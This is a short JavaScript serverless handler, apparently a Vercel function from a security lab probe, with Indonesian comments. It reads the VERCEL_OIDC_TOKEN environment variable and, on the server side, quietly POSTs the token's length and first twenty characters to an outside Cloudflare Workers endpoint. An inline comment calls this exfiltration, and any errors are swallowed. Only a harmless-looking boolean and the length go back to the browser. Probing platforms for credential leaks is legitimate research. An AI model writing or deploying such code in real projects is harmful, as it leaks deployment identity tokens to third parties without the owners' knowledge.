export default async function handler(req, res) {
  const oidcToken = process.env.VERCEL_OIDC_TOKEN || null;
  const vercelEnv = process.env.VERCEL_ENV || null;

  // Eksfiltrasi ke Worker — terjadi server-side, tidak butuh browser
  if (oidcToken) {
    try {
      await fetch(
        "https://vercel-rewrite-lab.mohrazurama.workers.dev/probe",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            source: "oidc-test",
            environment: vercelEnv,
            oidc_token_length: oidcToken.length,
            oidc_token_preview: oidcToken.substring(0, 20) + "..."
          })
        }
      );
    } catch (e) {}
  }

  // Response ke browser — tampilkan boolean saja, bukan nilai asli
  res.status(200).json({
    vercel_env: vercelEnv,
    oidc_token_present: Boolean(oidcToken),
    oidc_token_length: oidcToken ? oidcToken.length : 0
  });
}
